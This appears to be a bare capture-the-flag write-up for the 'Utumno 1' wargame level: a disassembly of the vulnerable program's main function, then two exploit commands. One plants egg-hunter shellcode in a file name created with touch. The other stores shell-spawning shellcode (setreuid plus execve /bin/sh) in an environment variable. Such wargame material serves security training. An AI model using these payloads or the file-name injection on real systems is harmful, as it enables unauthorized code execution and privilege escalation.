# Utumno 1

Disassembly

```
080484a6 <main>:
 80484a6:       55                      push   %ebp
 80484a7:       89 e5                   mov    %esp,%ebp
 80484a9:       83 e4 f0                and    $0xfffffff0,%esp
 80484ac:       83 ec 20                sub    $0x20,%esp
 80484af:       8b 45 0c                mov    0xc(%ebp),%eax
 80484b2:       83 c0 04                add    $0x4,%eax
 80484b5:       8b 00                   mov    (%eax),%eax
 80484b7:       85 c0                   test   %eax,%eax
 80484b9:       75 0c                   jne    80484c7 <main+0x21>
 80484bb:       c7 04 24 01 00 00 00    movl   $0x1,(%esp)
 80484c2:       e8 79 fe ff ff          call   8048340 <exit@plt>
 80484c7:       8b 45 0c                mov    0xc(%ebp),%eax
 80484ca:       83 c0 04                add    $0x4,%eax
 80484cd:       8b 00                   mov    (%eax),%eax
 80484cf:       89 04 24                mov    %eax,(%esp)
 80484d2:       e8 a9 fe ff ff          call   8048380 <opendir@plt>
 80484d7:       89 44 24 18             mov    %eax,0x18(%esp)
 80484db:       83 7c 24 18 00          cmpl   $0x0,0x18(%esp)
 80484e0:       75 0c                   jne    80484ee <main+0x48>
 80484e2:       c7 04 24 01 00 00 00    movl   $0x1,(%esp)
 80484e9:       e8 52 fe ff ff          call   8048340 <exit@plt>
 80484ee:       eb 32                   jmp    8048522 <main+0x7c>
 80484f0:       8b 44 24 1c             mov    0x1c(%esp),%eax
 80484f4:       83 c0 0b                add    $0xb,%eax
 80484f7:       c7 44 24 08 03 00 00    movl   $0x3,0x8(%esp)
 80484fe:       00 
 80484ff:       89 44 24 04             mov    %eax,0x4(%esp)
 8048503:       c7 04 24 d0 85 04 08    movl   $0x80485d0,(%esp)
 804850a:       e8 61 fe ff ff          call   8048370 <strncmp@plt>
 804850f:       85 c0                   test   %eax,%eax
 8048511:       75 0f                   jne    8048522 <main+0x7c>
 8048513:       8b 44 24 1c             mov    0x1c(%esp),%eax
 8048517:       83 c0 0e                add    $0xe,%eax
 804851a:       89 04 24                mov    %eax,(%esp)
 804851d:       e8 6b ff ff ff          call   804848d <run>
 8048522:       8b 44 24 18             mov    0x18(%esp),%eax
 8048526:       89 04 24                mov    %eax,(%esp)
 8048529:       e8 32 fe ff ff          call   8048360 <readdir@plt>
 804852e:       89 44 24 1c             mov    %eax,0x1c(%esp)
 8048532:       83 7c 24 1c 00          cmpl   $0x0,0x1c(%esp)
 8048537:       75 b7                   jne    80484f0 <main+0x4a>
 8048539:       b8 00 00 00 00          mov    $0x0,%eax
 804853e:       c9                      leave  
 804853f:       c3                      ret
 ```
 
 
 ```
 touch $(python -c 'print "sh_\xfc\x31\xc9\xf7\xe1\x66\x81\xca\xff\x0f\x42\x6a\x21\x58\x8d\x5a\x04\xcd\x80\x3c\xf2\x74\xee\xb8\x90\x50\x90\x50\x89\xd7\xaf\x75\xe9\xaf\x75\xe6\xff\xe7"')
 ```

```
export EGG=$(python -c 'print "\x90\x50\x90\x50\x90\x50\x90\x50\x6a\x46\x58\x31\xdb\x31\xc9\xcd\x80\x31\xd2\x6a\x0b\x58\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80"')
```
